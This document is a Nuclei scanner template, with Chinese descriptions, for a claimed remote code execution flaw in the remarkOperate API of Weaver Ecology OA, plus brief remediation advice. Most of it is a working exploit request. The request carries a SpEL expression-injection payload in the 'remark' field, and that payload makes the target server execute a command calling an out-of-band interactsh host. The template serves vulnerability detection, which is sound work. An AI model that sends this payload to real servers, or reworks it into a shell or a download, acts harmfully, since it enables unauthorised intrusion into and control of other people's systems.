id: ecology-remarkoperate-rce

info:
  name: Ecology remarkOperate 远程代码执行漏洞
  author: qwtd
  severity: critical
  description: |-
    泛微Ecology的remarkOperate接口存在远程代码执行漏洞，攻击者可利用该漏洞在目标服务器上执行任意代码，进而获取服务器控制权。
  metadata:
    max-request: 1
  tags: 泛微-协同办公OA
  remediation: >-
    升级到包含漏洞修复的最新厂商支持版本。在完成升级前，限制对受影响端点的访问，尽可能禁用存在风险的功能，落实最小权限原则，并监控可疑的进程执行行为。

http:
  - raw:
      - |
        POST /api/workflow/reqform/remarkOperate HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "operate": "save",
          "field5": "5241,5240",
          "IsBeForwardSubmitAlready": "1",
          "IsBeForwardAlready": "0",
          "IsSubmitedOpinion": "1",
          "IsBeForwardTodo": "0",
          "forwardflag": "1",
          "requestid": "5288726",
          "nodeid": "11995",
          "f_weaver_belongto_userid": "5240",
          "f_weaver_belongto_usertype": "0",
          "signworkflowids": "",
          "signdocids": "",
          "remarkLocation": "",
          "remark": "${T(java.lang.Runtime).getRuntime().exec('ping {{interactsh-url}}')}",
          "remindTypes": "0,2"
        }
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - http
